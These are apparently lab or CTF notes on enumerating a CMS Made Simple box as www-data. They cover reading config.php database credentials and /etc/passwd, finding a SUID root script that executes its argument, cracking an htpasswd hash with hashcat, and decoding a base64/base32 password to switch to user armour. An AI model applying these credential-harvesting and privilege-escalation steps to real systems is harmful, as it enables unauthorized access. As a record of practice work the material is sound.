# 5 box enum www-data

```
www-data@mycmsms:/var/www/html$ cat config.php
<?php
$config['dbms'] = 'mysqli';
$config['db_hostname'] = 'localhost';
$config['db_username'] = 'root';
$config['db_password'] = 'root';
$config['db_name'] = 'cmsms_db';
$config['db_prefix'] = 'cms_';
$config['timezone'] = 'America/New_York';
?>

www-data@mycmsms:/var/www/html$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
[truncated]
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
armour:x:1000:1000:Armour Infosec,,,:/home/armour:/bin/bash

www-data@mycmsms:/home/armour$ ls -la
total 36
drwxr-xr-x 4 armour armour 4096 Aug 28  2020 .
drwxr-xr-x 3 root   root   4096 Mar 25  2020 ..
-rw------- 1 armour armour    0 Aug 20  2020 .bash_history
-rw-r--r-- 1 armour armour  220 Mar 25  2020 .bash_logout
-rw-r--r-- 1 armour armour 3526 Mar 25  2020 .bashrc
drwx------ 3 armour armour 4096 Jun 29  2020 .gnupg
drwxr-xr-x 3 armour armour 4096 Aug 20  2020 .local
-rw-r--r-- 1 armour armour  807 Mar 25  2020 .profile
-rw------- 1 armour armour  736 Jun 25  2020 .viminfo
-rwsr-xr-x 1 root   root     57 Jun 24  2020 binary.sh
```

#### SuidEnum

```
[~] Custom SUID Binaries (Interesting Stuff)
------------------------------
/home/armour/binary.sh
------------------------------

www-data@mycmsms:/tmp$ ls -la /home/armour/binary.sh
-rwsr-xr-x 1 root root 57 Jun 24  2020 /home/armour/binary.sh
www-data@mycmsms:/tmp$ cat /home/armour/binary.sh
#!/bin/bash
echo "Usage: binary.sh COMMAND"
echo `$1`
```

### PEAS

```
╣ Users with console
armour:x:1000:1000:Armour Infosec,,,:/home/armour:/bin/bash
root:x:0:0:root:/root:/bin/bash

lrwxrwxrwx 1 root root 35 Mar 25  2020 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
# The ServerName directive sets the request scheme, hostname and port that
# redirection URLs. In the context of virtual hosts, the ServerName
#ServerName www.example.com
		AuthType Basic
		AuthName "Restricted Content"
		AuthUserFile /etc/apache2/.htpasswd
	
╣ Analyzing Htpasswd Files (limit 70)
-rw-r--r-- 1 root root 44 May 31  2020 /etc/apache2/.htpasswd
admin:$apr1$xcVPTQ1f$RSPY3ZneahnCI1a6Qr32S1
$ hashcat -m 1600 hash /usr/share/wordlists/rockyou.txt  --show
$apr1$xcVPTQ1f$RSPY3ZneahnCI1a6Qr32S1:password123456789


-rw-r--r-- 1 www-data www-data 45 Jun 24  2020 /var/www/html/admin/.htpasswd
TUZaRzIzM1ZPSTVGRzJESk1WV0dJUUJSR0laUT09PT0=
# base64 -d 
MFZG233VOI5FG2DJMVWGIQBRGIZQ====
# base32 -d 
armour:Shield@123

$ echo "TUZaRzIzM1ZPSTVGRzJESk1WV0dJUUJSR0laUT09PT0=" | base64 -d | base32 -d
armour:Shield@123

# we can su armour
# works

armour@mycmsms:~$ whoami;id
armour
uid=1000(armour) gid=1000(armour) groups=1000(armour),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
```
